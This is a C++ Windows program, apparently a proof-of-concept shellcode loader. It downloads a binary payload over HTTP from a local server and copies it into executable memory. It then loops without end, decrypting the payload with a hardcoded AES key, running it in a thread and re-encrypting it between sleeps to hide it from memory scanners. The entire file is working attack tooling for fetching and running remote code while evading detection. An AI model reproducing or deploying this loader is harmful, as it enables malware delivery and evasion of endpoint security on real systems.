#include <windows.h>
#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <iomanip>
#include "aes.h" // Include Tiny AES header
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

using namespace std;

// AES key and initialization vector
const uint8_t aesKey[16] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F };
const uint8_t aesIV[16] = { 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
                           0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F };

// Function to download a file from a server
bool downloadFile(const wstring& server, const wstring& path, vector<uint8_t>& buffer) {
    HINTERNET hSession = WinHttpOpen(L"Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, server.c_str(), 8000, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD bytesRead = 0;
    do {
        uint8_t bufferPart[4096];
        if (WinHttpReadData(hRequest, bufferPart, sizeof(bufferPart), &bytesRead) && bytesRead > 0) {
            buffer.insert(buffer.end(), bufferPart, bufferPart + bytesRead);
        }
    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return true;
}

// Encrypt memory using Tiny AES
void aesEncrypt(void* buffer, size_t size) {
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aesKey, aesIV);
    AES_CBC_encrypt_buffer(&ctx, static_cast<uint8_t*>(buffer), size);
}

// Decrypt memory using Tiny AES
void aesDecrypt(void* buffer, size_t size) {
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aesKey, aesIV);
    AES_CBC_decrypt_buffer(&ctx, static_cast<uint8_t*>(buffer), size);
}

// Function to print buffers in hexadecimal format
void printBuffer(const char* label, const uint8_t* buffer, size_t size) {
    cout << label << ": ";
    for (size_t i = 0; i < size; i++) {
        cout << hex << setw(2) << setfill('0') << (int)buffer[i] << " ";
        if ((i + 1) % 16 == 0) cout << endl;
    }
    cout << endl;
}

int main() {
    const wstring server = L"localhost";
    const wstring path = L"/calc.bin";

    // Step 1: Download the .bin file
    vector<uint8_t> binBuffer;
    if (!downloadFile(server, path, binBuffer)) {
        cerr << "Failed to download the file!" << endl;
        return 1;
    }

    cout << "[+] Downloaded .bin file, size: " << binBuffer.size() << " bytes." << endl;

    // Debug: Print the original buffer
    printBuffer("[DEBUG] Original Buffer", binBuffer.data(), binBuffer.size());

    // Step 2: Print the AES key and IV
    printBuffer("[DEBUG] AES Key", aesKey, sizeof(aesKey));
    printBuffer("[DEBUG] AES IV", aesIV, sizeof(aesIV));

    // Step 3: Allocate executable memory for the new function
    void* funcMemory = VirtualAlloc(NULL, binBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!funcMemory) {
        cerr << "Failed to allocate memory for the function!" << endl;
        return 1;
    }

    cout << "[+] Allocated executable memory at: 0x" << hex << (uintptr_t)funcMemory << endl;

    // Step 4: Copy the binary data to the allocated memory
    memcpy(funcMemory, binBuffer.data(), binBuffer.size());
    cout << "[+] Copied binary data to allocated memory." << endl;

    // Debug: Print the encrypted buffer before execution
    aesEncrypt(funcMemory, binBuffer.size());
    cout << "[+] Function encrypted." << endl;
    printBuffer("[DEBUG] Encrypted Buffer", (uint8_t*)funcMemory, binBuffer.size());

    // Step 5: Main loop: Decrypt, execute, and re-encrypt
    while (true) {
        aesDecrypt(funcMemory, binBuffer.size());
        cout << "[+] Function decrypted. Executing..." << endl;

        // Debug: Print the decrypted buffer
        printBuffer("[DEBUG] Decrypted Buffer", (uint8_t*)funcMemory, binBuffer.size());

        // Create a thread to execute the function
        HANDLE hThread = CreateThread(
            NULL, 0, (LPTHREAD_START_ROUTINE)funcMemory, NULL, 0, NULL
        );

        if (!hThread) {
            cerr << "Failed to create thread for execution!" << endl;
            break;
        }

        // Wait for the thread to complete with a timeout (e.g., 10 seconds)
        DWORD waitResult = WaitForSingleObject(hThread, 10000); // Timeout of 10 seconds
        if (waitResult == WAIT_TIMEOUT) {
            cerr << "[!] Thread execution timed out. Terminating thread..." << endl;
            TerminateThread(hThread, 1); // Force terminate the thread
        }
        else if (waitResult == WAIT_OBJECT_0) {
            cout << "[+] Thread execution completed successfully." << endl;
        }
        else {
            cerr << "[!] Unknown error occurred while waiting for thread." << endl;
        }

        CloseHandle(hThread);

        // Re-encrypt the function
        aesEncrypt(funcMemory, binBuffer.size());
        cout << "[+] Function re-encrypted." << endl;

        printBuffer("[DEBUG] Re-encrypted Buffer", (uint8_t*)funcMemory, binBuffer.size());

        this_thread::sleep_for(chrono::seconds(20));
    }

    return 0;
}
